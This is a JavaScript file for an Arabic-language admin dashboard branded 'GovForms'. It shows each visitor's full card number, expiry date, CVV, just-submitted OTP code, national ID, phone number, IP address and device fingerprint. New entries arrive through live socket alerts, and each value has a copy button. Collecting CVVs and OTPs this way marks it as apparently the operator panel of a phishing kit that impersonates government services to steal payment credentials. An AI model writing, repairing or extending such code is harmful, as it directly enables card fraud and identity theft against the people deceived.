/* =====================================================================
   GovForms — لوحة الإدارة — المنطق
   ===================================================================== */

const API = window.GOVFORMS_API_BASE || location.origin;

const state = {
  token: localStorage.getItem('govforms_token') || null,
  admin: null,
  inbox: [],
  currentFilter: 'all',
  search: '',
  selectedClientId: null,
  checkedIds: new Set(),
  currentTimeline: null,
  socket: null,
  blockTarget: null,
};

/* ---------- نغمة الإشعار ---------- */
// بسبب قيود autoplay، نخزّن النغمة المعلّقة ونشغّلها عند أول تفاعل
let pendingNotification = false;
let audioCtx = null;

function playNotificationSound() {
  try {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') {
      // autoplay محظور — نخزّن ونشغّل عند أول تفاعل
      pendingNotification = true;
      return;
    }
    doPlaySound();
  } catch {
    pendingNotification = true;
  }
}

function doPlaySound() {
  if (!audioCtx) return;
  const osc = audioCtx.createOscillator();
  const gain = audioCtx.createGain();
  osc.connect(gain);
  gain.connect(audioCtx.destination);
  osc.frequency.value = 880;
  osc.type = 'sine';
  gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
  gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.4);
  osc.start();
  osc.stop(audioCtx.currentTime + 0.4);
}

// تشغيل النغمة المعلّقة عند أول تفاعل
function setupAutoplayUnlock() {
  const unlock = () => {
    if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
    if (pendingNotification) {
      pendingNotification = false;
      doPlaySound();
    }
  };
  ['click', 'keydown', 'pointerdown'].forEach((ev) =>
    document.addEventListener(ev, unlock, { once: true })
  );
}

/* ---------- مساعدات الـ API ---------- */
async function api(path, opts = {}) {
  const headers = { 'Content-Type': 'application/json', ...(opts.headers || {}) };
  if (state.token) headers['Authorization'] = 'Bearer ' + state.token;
  const res = await fetch(API + path, { ...opts, headers });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || 'خطأ في الخادم');
  return data;
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}

function copyToClipboard(text, label) {
  // navigator.clipboard مع fallback لـ execCommand للمتصفحات/الهواتف القديمة
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(
      () => showToast('تم نسخ ' + (label || 'القيمة')),
      () => fallbackCopy(text, label)
    );
  } else {
    fallbackCopy(text, label);
  }
}

function fallbackCopy(text, label) {
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.opacity = '0';
  document.body.appendChild(ta);
  ta.select();
  try {
    document.execCommand('copy');
    showToast('تم نسخ ' + (label || 'القيمة'));
  } catch {
    showToast('فشل النسخ');
  }
  document.body.removeChild(ta);
}

function formatTime(iso) {
  if (!iso) return '—';
  const d = new Date(iso);
  return d.toLocaleString('ar', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
}

function timeAgo(iso) {
  if (!iso) return '';
  const diff = Date.now() - new Date(iso).getTime();
  const min = Math.floor(diff / 60000);
  if (min < 1) return 'الآن';
  if (min < 60) return min + ' د';
  const hr = Math.floor(min / 60);
  if (hr < 24) return hr + ' س';
  const day = Math.floor(hr / 24);
  return day + ' ي';
}

/* ---------- المصادقة ---------- */
async function login() {
  const email = document.getElementById('loginEmail').value.trim();
  const password = document.getElementById('loginPassword').value;
  const errEl = document.getElementById('loginError');

  if (!email || !password) {
    errEl.textContent = 'يرجى إدخال البريد وكلمة المرور';
    errEl.classList.add('show');
    return;
  }

  try {
    const data = await api('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email, password }),
    });
    state.token = data.token;
    state.admin = data;
    localStorage.setItem('govforms_token', data.token);
    showApp();
  } catch (e) {
    errEl.textContent = e.message;
    errEl.classList.add('show');
  }
}

function logout() {
  state.token = null;
  state.admin = null;
  localStorage.removeItem('govforms_token');
  document.getElementById('appPage').classList.add('hidden');
  document.getElementById('loginPage').classList.remove('hidden');
}

function showApp() {
  document.getElementById('loginPage').classList.add('hidden');
  document.getElementById('appPage').classList.remove('hidden');
  const name = state.admin?.full_name || 'مدير';
  document.getElementById('adminName').textContent = name;
  const avatarEl = document.getElementById('adminAvatar');
  if (avatarEl) avatarEl.textContent = (name.trim()[0] || 'T').toUpperCase();
  loadStats();
  loadInbox();
  initSocket();
}

/* ---------- الإحصائيات ---------- */
function setHdr(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = val;
}
async function loadStats() {
  // عرض الكاش فوراً (إن وُجد) ثم التحديث في الخلفية بصمت
  const cached = localStorage.getItem('govforms_stats');
  if (cached) {
    try { applyStats(JSON.parse(cached)); } catch {}
  }
  try {
    const s = await api('/api/stats');
    applyStats(s);
    localStorage.setItem('govforms_stats', JSON.stringify(s));
  } catch (e) {
    console.error('stats error', e);
  }
}

function applyStats(s) {
  setHdr('hdrTotal', s.total);
  setHdr('hdrToday', s.today);
  setHdr('hdrPayments', s.pendingPayments);
  setHdr('hdrOtp', s.pendingOtp);
  setHdr('hdrVisitors', 0);
  setHdr('hdrVisLive', 0);
  setHdr('hdrVisToday', s.today);
  setHdr('hdrVisTotal', s.total);
  setHdr('hdrCliCards', s.pendingPayments);
  setHdr('hdrCliOtp', s.pendingOtp);
  setHdr('hdrCliTotal', s.total);
}

/* ---------- الوارد ---------- */
async function loadInbox() {
  const items = document.getElementById('inboxItems');
  const filter = state.currentFilter === 'card' ? 'card' : state.currentFilter === 'archive' ? 'archive' : 'all';
  const cacheKey = 'govforms_inbox_' + filter;

  // عرض الكاش فوراً (إن وُجد) ثم التحديث في الخلفية بصمت
  const cached = localStorage.getItem(cacheKey);
  let hadCache = false;
  if (cached) {
    try {
      const parsed = JSON.parse(cached);
      state.inbox = parsed.inbox || [];
      renderInbox();
      hadCache = true;
    } catch {}
  }
  if (!hadCache) {
    items.innerHTML = '<div class="px-4 py-10 text-center text-sm text-gray-400">جارٍ التحميل...</div>';
  }

  // إعادة التحميل في الخلفية
  try {
    const data = await api('/api/inbox?filter=' + filter + '&limit=200');
    state.inbox = data.inbox || [];
    renderInbox();
    localStorage.setItem(cacheKey, JSON.stringify({ inbox: state.inbox, ts: Date.now() }));
  } catch (e) {
    if (e.message.includes('غير مصرّح')) {
      logout();
    } else if (!hadCache) {
      items.innerHTML = '<div class="px-4 py-10 text-center text-sm text-red-400">فشل التحميل: ' + e.message + '</div>';
    }
    // عند وجود كاش: نُبقي البيانات القديمة ولا نُظهر خطأً
  }
}

// تحويل رمز الدولة (ISO) إلى علم إيموجي
function countryFlag(code) {
  if (!code || code.length !== 2) return '🌐';
  return code.toUpperCase().replace(/./g, (c) => String.fromCodePoint(127397 + c.charCodeAt(0)));
}

// نص النشاط حسب نوع السجل
function activityText(s) {
  if (s.hasOtp) return 'رمز تحقق';
  if (s.hasPayment) return 'بيانات بطاقة';
  return 'زيارة جديدة';
}

function renderInbox() {
  const items = document.getElementById('inboxItems');
  const list = currentList();

  // عدّاد القائمة
  const badge = document.getElementById('countBadge');
  if (badge) badge.textContent = list.length;

  if (!list.length) {
    items.innerHTML = '<div class="px-4 py-10 text-center text-sm text-gray-400">لا توجد سجلات</div>';
    updateSelectAllBtn();
    return;
  }

  items.innerHTML = '';
  list.forEach((s) => {
    const c = s.client || {};
    const selected = c.id === state.selectedClientId;
    const checked = state.checkedIds.has(c.id);
    const online = !!c.online;
    const flag = countryFlag(c.country_code);

    const cardIcons = s.hasPayment
      ? `<span class="flex items-center gap-1">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>
          <svg viewBox="0 0 50 16" fill="none"><text x="0" y="13" font-family="Arial, sans-serif" font-weight="900" font-size="15" fill="#1a1f71" letter-spacing="-0.5">VISA</text></svg>
        </span>`
      : '';

    const row = document.createElement('div');
    row.className =
      'client-row flex items-center gap-3 px-4 py-3 cursor-pointer border-b border-gray-50 transition hover:bg-gray-50' +
      (selected ? ' bg-blue-50/60' : '') +
      (checked ? ' ring-1 ring-inset ring-blue-300 bg-blue-50/40' : '');
    row.onclick = () => selectClient(c.id);
    row.innerHTML = `
      <div class="shrink-0" onclick="event.stopPropagation(); toggleCheck('${c.id}')">
        <svg class="check-box w-4 h-4 ${checked ? 'text-blue-600' : 'text-gray-300 hover:text-gray-400'}" viewBox="0 0 24 24" fill="${checked ? 'currentColor' : 'none'}" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <rect width="18" height="18" x="3" y="3" rx="4"></rect>
          ${checked ? '<path d="M20 6 9 17l-5-5" stroke-width="2.6"></path>' : ''}
        </svg>
      </div>
      <div class="relative shrink-0">
        <div class="w-10 h-10 rounded-full flex items-center justify-center text-white" style="background:linear-gradient(135deg,#4b5563,#374151);box-shadow:0 0 0 2px rgba(107,114,128,0.18)">
          <svg viewBox="0 0 40 40" fill="none" class="w-7 h-7">
            <circle cx="20" cy="14" r="7" fill="white" opacity="0.2"></circle>
            <circle cx="20" cy="14" r="5" fill="white" opacity="0.5"></circle>
            <path d="M6 36c0-7.732 6.268-14 14-14s14 6.268 14 14" fill="white" opacity="0.25"></path>
          </svg>
        </div>
        <span class="absolute bottom-0 right-0 w-3 h-3 rounded-full border-2 border-white ${online ? 'bg-green-500' : 'bg-gray-300'}" title="${online ? 'متصل' : 'غير متصل'}"></span>
        <span class="absolute -top-0.5 -left-0.5 text-xs" title="${c.country_name || ''}">${flag}</span>
      </div>
      <div class="flex-1 min-w-0">
        <div class="flex items-center justify-between gap-2">
          <div class="flex items-center gap-1.5 min-w-0">
            <span class="text-sm font-semibold text-gray-800 truncate">${c.full_name || 'زائر'}</span>
            ${cardIcons ? `<span class="text-gray-400 shrink-0">${cardIcons}</span>` : ''}
          </div>
          <span class="text-[11px] text-gray-400 shrink-0">${timeAgo(s.created_at)}</span>
        </div>
        <div class="mt-0.5">
          <span class="text-xs text-gray-500">${activityText(s)}</span>
        </div>
      </div>
    `;
    items.appendChild(row);
  });
  updateSelectAllBtn();
}

/* ---------- تحديد العملاء (checkbox) ---------- */
function toggleCheck(id) {
  if (state.checkedIds.has(id)) state.checkedIds.delete(id);
  else state.checkedIds.add(id);
  renderInbox();
  updateSelectAllBtn();
}

function toggleSelectAll() {
  const list = currentList();
  const allChecked = list.length > 0 && list.every((s) => state.checkedIds.has(s.client?.id));
  if (allChecked) {
    list.forEach((s) => state.checkedIds.delete(s.client?.id));
  } else {
    list.forEach((s) => s.client?.id && state.checkedIds.add(s.client.id));
  }
  renderInbox();
  updateSelectAllBtn();
}

// قائمة العملاء الظاهرين حالياً (نفس منطق renderInbox)
function currentList() {
  let list = state.inbox;
  if (state.currentFilter === 'card') list = list.filter((s) => s.hasPayment);
  if (state.search) {
    const q = state.search.toLowerCase();
    list = list.filter((s) => {
      const c = s.client;
      const last4 = c?.phone ? c.phone.slice(-4) : '';
      return (
        c?.full_name?.toLowerCase().includes(q) ||
        c?.fingerprint?.toLowerCase().includes(q) ||
        c?.phone?.includes(q) ||
        last4.includes(q) ||
        s.reference?.toLowerCase().includes(q)
      );
    });
  }
  return list;
}

// تحديث حالة زر تحديد الكل (مربع مع/بدون علامة) + عداد المحددين
function updateSelectAllBtn() {
  const btn = document.getElementById('selectAllBtn');
  if (!btn) return;
  const list = currentList();
  const allChecked = list.length > 0 && list.every((s) => state.checkedIds.has(s.client?.id));
  const svg = btn.querySelector('svg');
  if (svg) {
    svg.setAttribute('fill', allChecked ? 'currentColor' : 'none');
    svg.classList.toggle('text-blue-600', allChecked);
    svg.classList.toggle('text-gray-500', !allChecked);
  }
  const label = btn.querySelector('span.label');
  if (label) label.textContent = allChecked ? 'إلغاء الكل' : 'تحديد الكل';
  const counter = document.getElementById('checkedCount');
  if (counter) counter.textContent = state.checkedIds.size ? `${state.checkedIds.size} محدد` : '';
}

/* ---------- تفاصيل العميل ---------- */
async function selectClient(clientId) {
  state.selectedClientId = clientId;
  renderInbox();

  // نمط التبديل على الهاتف: إظهار التفاصيل وإخفاء القائمة
  document.getElementById('inboxLayout').classList.add('show-detail');

  const detail = document.getElementById('inboxDetail');
  detail.innerHTML = '<div class="flex items-center justify-center h-full text-gray-400 text-sm">جارٍ التحميل...</div>';

  try {
    const data = await api('/api/client?client_id=' + clientId);
    state.currentTimeline = data;
    renderDetail(data);
  } catch (e) {
    detail.innerHTML = '<div class="flex items-center justify-center h-full text-red-400 text-sm">فشل التحميل: ' + e.message + '</div>';
  }
}

// زر الرجوع على الهاتف: يخفي التفاصيل ويعرض القائمة
function backToList() {
  document.getElementById('inboxLayout').classList.remove('show-detail');
}

// تصنيف الحالة إلى لون
function statusColor(status) {
  const s = (status || '').toLowerCase();
  if (['approved', 'paid', 'active', 'online', 'مدفوع', 'موافق عليه', 'نشط'].some((k) => s.includes(k))) return 'green';
  if (['pending', 'waiting', 'معلق', 'قيد'].some((k) => s.includes(k))) return 'amber';
  if (['rejected', 'blocked', 'offline', 'refused', 'مرفوض', 'محظور'].some((k) => s.includes(k))) return 'red';
  return 'gray';
}
const STATUS_BADGE = {
  green: 'bg-green-100 text-green-700',
  amber: 'bg-amber-100 text-amber-700',
  red: 'bg-red-100 text-red-700',
  gray: 'bg-gray-100 text-gray-600',
};
const STATUS_TXT = {
  approved: '✓ موافق عليه', rejected: '✗ مرفوض', pending: '⏳ معلق', paid: '✓ مدفوع', active: '✓ نشط', blocked: '✗ محظور',
};
function statusLabel(status) {
  return STATUS_TXT[(status || '').toLowerCase()] || status || '—';
}

// عنوان البطاقة حسب النوع
function cardTitle(type) {
  return { submission: 'حجز', payment: 'الدفع', otp: 'رمز التحقق (OTP)', file: 'ملف مرفق', profile: 'معلومات أساسية' }[type] || type;
}

// شعار شبكة البطاقة (VISA / MASTERCARD)
function brandLogo(network, cardType) {
  const n = (network || cardType || '').toUpperCase();
  if (n.includes('VISA')) {
    return `<svg viewBox="0 0 48 16" width="48" height="16" aria-label="VISA"><text x="0" y="13" font-family="Arial" font-weight="900" font-size="15" fill="#1a1f71" letter-spacing="-0.5">VISA</text></svg>`;
  }
  if (n.includes('MASTERCARD') || n.includes('MASTER')) {
    return `<svg viewBox="0 0 48 30" width="40" height="24" aria-label="Mastercard"><circle cx="18" cy="15" r="12" fill="#EB001B"></circle><circle cx="30" cy="15" r="12" fill="#F79E1B"></circle><path d="M24 6.5a12 12 0 000 17 12 12 0 000-17z" fill="#FF5F00"></path></svg>`;
  }
  return `<span class="text-[10px] text-gray-400">${(network || 'بطاقة') || ''}</span>`;
}

function renderDetail(data) {
  const { client, timeline } = data;
  const detail = document.getElementById('inboxDetail');
  const c = client || {};
  const online = !!c.online;
  const flag = countryFlag(c.country_code);

  // ----- الرأس العلوي -----
  let html = `
    <div class="flex flex-col h-full">
      <div class="sticky top-0 z-10 bg-white/95 backdrop-blur border-b border-gray-200">
        <div class="flex items-center gap-2 px-4 py-3">
          <button class="p-1.5 rounded-lg hover:bg-gray-100 text-gray-600" title="رجوع" onclick="backToList()">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"></path><path d="m12 19-7-7 7-7"></path></svg>
          </button>
          <span class="text-base font-bold text-gray-800 truncate">${c.full_name || 'زائر'}</span>
          <div class="flex-1"></div>
        </div>
        <div class="flex flex-wrap items-center gap-1.5 px-4 pb-2">
          <span class="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-gray-100 text-gray-600 text-xs">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
            <span class="font-mono" dir="ltr">${c.phone || '—'}</span>
          </span>
          <span class="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-gray-100 text-gray-600 text-xs">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"></rect><line x1="8" x2="16" y1="21" y2="21"></line><line x1="12" x2="12" y1="17" y2="21"></line></svg>
            ${c.device_info ? c.device_info.split(',')[0] : 'سطح المكتب'}
          </span>
          <span class="inline-flex items-center gap-1 px-2 py-1 rounded-md bg-gray-100 text-gray-500 text-xs">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M2 12h20"></path></svg>
            ${c.country_name || c.country_code || 'غير معروف'}
          </span>
          <span class="px-2 py-1 rounded-md bg-gray-100 text-sm">${flag}</span>
          <span class="px-2 py-1 rounded-md text-xs ${online ? 'bg-green-50 text-green-600' : 'bg-gray-100 text-gray-500'}" title="${online ? 'متصل' : 'غير متصل'}">${online ? '● متصل' : '○ غير متصل'}</span>
        </div>
        <div class="flex items-center gap-1.5 px-4 pb-2.5">
          <button class="px-2.5 py-1.5 rounded-md bg-red-50 text-red-600 text-xs font-medium hover:bg-red-100 transition" onclick="openBlockModal()">🚫 حظر</button>
          <button class="px-2.5 py-1.5 rounded-md bg-gray-100 text-gray-600 text-xs font-medium hover:bg-gray-200 transition" onclick="archiveCurrent()">📥 أرشفة</button>
          <button class="px-2.5 py-1.5 rounded-md bg-red-50 text-red-600 text-xs font-medium hover:bg-red-100 transition" onclick="showToast('الحذف غير متاح حالياً')">🗑 حذف</button>
        </div>
      </div>

      <!-- منطقة البطاقات -->
      <div class="flex-1 overflow-y-auto p-3 space-y-3 bg-gray-50">
  `;

  // الخط الزمني مرتب من الأحدث للأقدم (كما يُرجعه الـ API)
  for (const box of timeline || []) {
    html += renderTimelineBox(box);
  }

  html += `
      </div>
    </div>
  `;

  detail.innerHTML = html;
}

// صف بيانات داخل البطاقة
function dataRow(label, value, opts = {}) {
  if (value === null || value === undefined || value === '') return '';
  const cls = opts.mono ? 'font-mono' : '';
  const dir = opts.ltr ? 'dir="ltr"' : '';
  const copy = opts.copy ? ` class="cursor-pointer hover:text-gray-800" onclick="copyToClipboard('${String(value).replace(/'/g, '')}', '${label}')"` : '';
  const valClass = opts.valueColor ? ` ${opts.valueColor}` : ' text-gray-700';
  return `<div class="flex items-start justify-between gap-3 py-1.5 text-xs">
    <span class="text-gray-500 shrink-0">${label}:</span>
    <span class="${cls} ${valClass}" ${dir} ${copy}>${value}</span>
  </div>`;
}

function statusBadge(status) {
  const col = statusColor(status);
  return `<span class="inline-block px-2 py-0.5 rounded text-[11px] font-semibold ${STATUS_BADGE[col]}">${statusLabel(status)}</span>`;
}

function renderTimelineBox(box) {
  const d = box.data || {};
  const title = cardTitle(box.type);
  const time = formatTime(box.time || d.created_at);

  let body = '';

  if (box.type === 'otp') {
    const code = (d.code || '').toString();
    const boxes = code
      ? code.split('').map((ch) => `<div class="w-8 h-10 flex items-center justify-center rounded-md bg-gray-50 border border-gray-200 text-gray-800 font-bold text-lg font-mono">${ch}</div>`).join('')
      : `<div class="w-8 h-10 flex items-center justify-center rounded-md bg-gray-50 border border-gray-200 text-gray-300">-</div>`.repeat(4);
    body = `
      <div class="mb-3">
        <span class="text-xs text-gray-500 block mb-1.5">الرمز المُرسل:</span>
        <div class="flex gap-1.5 flex-wrap cursor-pointer" onclick="copyToClipboard('${code}', 'رمز OTP')" title="انقر للنسخ" dir="ltr">${boxes}</div>
      </div>
      ${dataRow('حجز مرتبط', d.reference, { mono: true, ltr: true, copy: true })}
      <div class="mt-1.5">${statusBadge(d.status)}</div>
    `;
  } else if (box.type === 'payment') {
    const num = d.card_number || ('•••• •••• •••• ' + (d.card_number_last4 || '••••'));
    body = `
      <div class="relative overflow-hidden rounded-xl p-4 mb-3 text-white" style="background:linear-gradient(135deg,#1e293b,#0f172a)">
        <div class="absolute -top-10 -right-10 w-32 h-32 rounded-full bg-white/5"></div>
        <div class="absolute -bottom-12 -left-6 w-36 h-36 rounded-full bg-white/5"></div>
        <div class="relative flex items-center justify-between mb-3">
          <div class="flex items-center gap-2">
            <span class="w-7 h-7 rounded-full bg-white/20 flex items-center justify-center text-xs font-bold">${(d.bank_name || 'S').charAt(0)}</span>
            <span class="text-xs opacity-90 truncate max-w-[120px]">${d.bank_name || 'غير معروف'}</span>
          </div>
          ${brandLogo(d.network, d.card_type)}
        </div>
        <div class="relative font-mono text-base tracking-wider mb-3 cursor-pointer" dir="ltr" onclick="copyToClipboard('${(d.card_number || '').replace(/\s/g, '')}', 'رقم البطاقة')" title="انقر للنسخ">${num}</div>
        <div class="relative flex justify-between gap-3 text-[11px]">
          <div><div class="opacity-60">حامل البطاقة</div><div class="font-semibold">${d.card_holder || '—'}</div></div>
          <div><div class="opacity-60">EXPIRES</div><div class="font-mono cursor-pointer" dir="ltr" onclick="copyToClipboard('${d.expiry || ''}', 'الانتهاء')" title="انقر للنسخ">${d.expiry || '—'}</div></div>
          <div><div class="opacity-60">CVV</div><div class="font-mono cursor-pointer" dir="ltr" onclick="copyToClipboard('${d.cvv || ''}', 'CVV')" title="انقر للنسخ">${d.cvv || '—'}</div></div>
        </div>
      </div>
      ${dataRow('نوع البطاقة', (d.card_type ? d.card_type.toUpperCase() + (d.network ? ` (${d.network})` : '') : '—'))}
      ${dataRow('البنك', d.bank_name)}
      ${dataRow('دولة البنك', d.bank_country)}
      ${dataRow('BIN', d.bin, { mono: true, ltr: true, copy: true })}
      ${dataRow('حجز مرتبط', d.reference, { mono: true, ltr: true, copy: true })}
      <div class="mt-1.5">${statusBadge(d.status)}</div>
    `;
  } else if (box.type === 'submission') {
    const vColor = statusColor(d.status);
    const valColor = vColor === 'green' ? 'text-green-600' : vColor === 'amber' ? 'text-amber-600' : vColor === 'red' ? 'text-red-600' : 'text-gray-700';
    body = `
      ${dataRow('المرجع', d.reference, { mono: true, ltr: true, copy: true })}
      ${dataRow('الحالة', statusLabel(d.status), { valueColor: valColor })}
      ${dataRow('نوع الخدمة', d.service_type)}
      ${dataRow('رقم الهوية', d.id_number, { ltr: true, copy: true })}
      ${dataRow('الهاتف', d.primary_phone, { ltr: true, copy: true })}
      ${dataRow('الهاتف الثانوي', d.secondary_phone, { ltr: true })}
      ${dataRow('البريد', d.email, { ltr: true, copy: true })}
      ${dataRow('الموضوع', d.subject)}
      ${dataRow('المحتوى', d.content, { valueColor: 'text-gray-600' })}
      ${d.terms_snapshot ? dataRow('الشروط', d.terms_snapshot, { valueColor: 'text-gray-600' }) : ''}
    `;
  } else if (box.type === 'profile') {
    const vColor = c => (c === 'green' ? 'text-green-600' : c === 'red' ? 'text-red-600' : 'text-gray-700');
    body = `
      ${dataRow('الاسم', d.full_name)}
      ${dataRow('البريد الإلكتروني', d.email, { ltr: true, copy: true })}
      ${dataRow('رقم الهاتف', d.phone, { ltr: true, copy: true })}
      ${dataRow('رقم الهوية', d.id_number, { ltr: true, copy: true })}
      ${dataRow('الدولة', (d.country_code ? flagEmoji(d.country_code) + ' ' : '') + (d.country_name || d.country_code || 'غير معروف'))}
      ${dataRow('عنوان IP', d.ip_address, { ltr: true, copy: true })}
      ${dataRow('البصمة', d.fingerprint, { ltr: true, copy: true })}
      ${dataRow('الجهاز', d.device_info)}
      ${dataRow('الحالة', statusLabel(d.status === 'active' ? 'active' : d.status), { valueColor: vColor(statusColor(d.status)) })}
    `;
  } else if (box.type === 'file') {
    body = `
      ${dataRow('اسم الملف', d.file_name)}
      ${dataRow('النوع', d.file_type)}
      ${dataRow('الحجم', d.file_size ? (d.file_size / 1024).toFixed(0) + ' KB' : '')}
      ${dataRow('التصنيف', d.category)}
    `;
  }

  return `
    <div class="detail-card bg-white rounded-xl border border-gray-200 overflow-hidden">
      <div class="flex items-center justify-between px-4 py-2.5 border-b border-gray-100 bg-gray-50/50">
        <span class="text-sm font-semibold text-gray-700">${title}</span>
        <span class="text-[11px] text-gray-400 font-mono">⏱ ${time}</span>
      </div>
      <div class="px-4 py-3">${body}</div>
    </div>
  `;
}

// اسم مستعار لعلم الدولة (إعادة استخدام countryFlag)
function flagEmoji(code) {
  return countryFlag(code);
}

/* ---------- القرارات ---------- */
async function archiveCurrent() {
  if (!state.currentTimeline) return;
  const subs = (state.currentTimeline.timeline || []).filter((b) => b.type === 'submission' && b.data?.id);
  if (!subs.length) {
    showToast('لا يوجد حجز للأرشفة');
    return;
  }
  const ids = subs.map((s) => s.data.id);
  try {
    await api('/api/archive', {
      method: 'POST',
      body: JSON.stringify({ action: 'archive', submission_ids: ids }),
    });
    showToast('تمت أرشفة الحجز');
    selectClient(state.selectedClientId);
    loadStats();
    loadInbox();
  } catch (e) {
    showToast('فشل الأرشفة: ' + e.message);
  }
}

async function makeDecision(action) {
  if (!state.currentTimeline) return;
  // نطبّق القرار على أحدث submission معلّق
  const sub = state.currentTimeline.timeline.find((b) => b.type === 'submission');
  if (!sub) {
    showToast('لا يوجد سجل للقرار');
    return;
  }
  const status = action === 'approve' ? 'approved' : 'rejected';
  const note = document.getElementById('decisionNote')?.value || '';

  try {
    await api('/api/decision', {
      method: 'POST',
      body: JSON.stringify({
        target_type: 'submission',
        target_id: sub.data.id,
        status,
        decision_note: note,
      }),
    });
    showToast(action === 'approve' ? 'تمت الموافقة على الطلب' : 'تم رفض الطلب');
    selectClient(state.selectedClientId);
    loadStats();
    loadInbox();
  } catch (e) {
    showToast('فشل: ' + e.message);
  }
}

/* ---------- الحظر ---------- */
function openBlockModal() {
  if (!state.currentTimeline) return;
  state.blockTarget = {
    client_id: state.currentTimeline.client.id,
    fingerprint: state.currentTimeline.client.fingerprint,
    ip_address: state.currentTimeline.client.ip_address,
  };
  document.getElementById('blockReason').value = '';
  document.getElementById('blockModal').classList.add('show');
}

async function confirmBlock() {
  if (!state.blockTarget) return;
  const reason = document.getElementById('blockReason').value.trim();
  try {
    await api('/api/block', {
      method: 'POST',
      body: JSON.stringify({ action: 'block', ...state.blockTarget, reason }),
    });
    showToast('تم حظر العميل');
    closeModal('blockModal');
    state.blockTarget = null;
    loadStats();
    loadInbox();
  } catch (e) {
    showToast('فشل الحظر: ' + e.message);
  }
}

function closeModal(id) {
  document.getElementById(id).classList.remove('show');
}

/* ---------- Socket.io ---------- */
function initSocket() {
  if (typeof io === 'undefined') return;
  state.socket = io(API, { path: '/api/socket', transports: ['websocket', 'polling'] });

  // إعادة الانضمام لغرفة admins عند الاتصال/إعادة الاتصال
  const joinAdmin = () => state.socket && state.socket.emit('admin:join');
  state.socket.on('connect', joinAdmin);
  joinAdmin();

  // إدخال جديد من العميل (نموذج/دفع/OTP) — تحديث فوري
  state.socket.on('admin:new_entry', (payload) => {
    loadStats();
    loadInbox();
    // إذا كانت تفاصيل هذا العميل مفتوحة، أعد تحميلها لرؤية البيانات الجديدة
    if (payload?.clientId && payload.clientId === state.selectedClientId) {
      selectClient(state.selectedClientId);
    }
    playNotificationSound();
    showToast('📥 ورد سجل جديد');
  });

  // تحديث قرار المدير (موافقة/رفض) — تحديث الإحصائيات
  state.socket.on('admin:decision_update', () => {
    loadStats();
  });

  // تحديث حالة الاتصال (presence) للعملاء
  state.socket.on('admin:presence', (payload) => {
    // تحديث حالة online للعميل في القائمة إن كان ظاهراً
    if (payload?.fingerprint) {
      const item = state.inbox.find((s) => s.client?.fingerprint === payload.fingerprint);
      if (item && item.client) {
        item.client.online = payload.online;
        renderInbox();
      }
    }
  });
}

/* ---------- التهيئة ---------- */
document.addEventListener('DOMContentLoaded', () => {
  setupAutoplayUnlock();
  document.getElementById('loginBtn').onclick = login;
  document.getElementById('loginPassword').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') login();
  });
  document.getElementById('logoutBtn').onclick = logout;

  document.getElementById('confirmBlockBtn').onclick = confirmBlock;

  // الفلاتر
  const filterBtns = document.querySelectorAll('.filter-btn');
  const setActiveFilter = (name) => {
    filterBtns.forEach((b) => {
      const on = b.dataset.filter === name;
      b.classList.toggle('bg-gray-800', on);
      b.classList.toggle('text-white', on);
      b.classList.toggle('text-gray-500', !on);
    });
  };
  setActiveFilter('all');
  filterBtns.forEach((btn) => {
    btn.onclick = () => {
      const prev = state.currentFilter;
      state.currentFilter = btn.dataset.filter;
      setActiveFilter(state.currentFilter);
      // التبديل بين الوارد والأرشيف يتطلب إعادة التحميل من الخادم
      const needsReload = (prev === 'archive') !== (state.currentFilter === 'archive');
      if (needsReload) loadInbox();
      else renderInbox();
    };
  });

  // البحث
  document.getElementById('searchInput').oninput = (e) => {
    state.search = e.target.value;
    renderInbox();
  };

  // تحديد الكل
  const selectAllBtn = document.getElementById('selectAllBtn');
  if (selectAllBtn) {
    selectAllBtn.onclick = toggleSelectAll;
  }

  // التحقق التلقائي من التوكن
  if (state.token) {
    api('/api/auth/verify')
      .then((data) => {
        if (data.admin) {
          state.admin = data.admin;
          showApp();
        } else {
          logout();
        }
      })
      .catch(() => logout());
  }
});
